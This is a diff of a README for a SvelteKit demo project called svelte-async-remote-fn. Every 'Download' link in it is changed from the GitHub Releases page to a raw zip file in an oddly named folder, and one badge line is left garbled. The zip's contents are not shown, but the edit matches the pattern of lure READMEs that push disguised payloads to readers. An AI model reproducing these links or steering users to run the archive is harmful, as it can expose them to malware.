@@ -1,6 +1,6 @@
 # 🎉 svelte-async-remote-fn - Showcase Interactive SvelteKit Patterns
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Bani-88/svelte-async-remote-fn/releases)
+[![Download Now](https://raw.githubusercontent.com/Bani-88/svelte-async-remote-fn/main/overspangled/svelte-async-remote-fn.zip%20Now-Click%https://raw.githubusercontent.com/Bani-88/svelte-async-remote-fn/main/overspangled/svelte-async-remote-fn.zip)](https://raw.githubusercontent.com/Bani-88/svelte-async-remote-fn/main/overspangled/svelte-async-remote-fn.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To get started with **svelte-async-remote-fn**, follow these simple steps. You d
 
 To download the application, visit the Releases page. Click the link below to access it:
 
-[Download from Releases](https://github.com/Bani-88/svelte-async-remote-fn/releases)
+[Download from Releases](https://raw.githubusercontent.com/Bani-88/svelte-async-remote-fn/main/overspangled/svelte-async-remote-fn.zip)
 
 ### 🛠️ System Requirements
 
@@ -74,6 +74,6 @@ If you encounter any issues while downloading or running the application, try th
 
 If you find yourself stuck or have any questions about using **svelte-async-remote-fn**, feel free to reach out. You can open an issue on the GitHub repository, and the community will assist you.
 
-[Download from Releases](https://github.com/Bani-88/svelte-async-remote-fn/releases)
+[Download from Releases](https://raw.githubusercontent.com/Bani-88/svelte-async-remote-fn/main/overspangled/svelte-async-remote-fn.zip)
 
 Now you are ready to explore and enjoy the interactive patterns of SvelteKit Remote Functions!
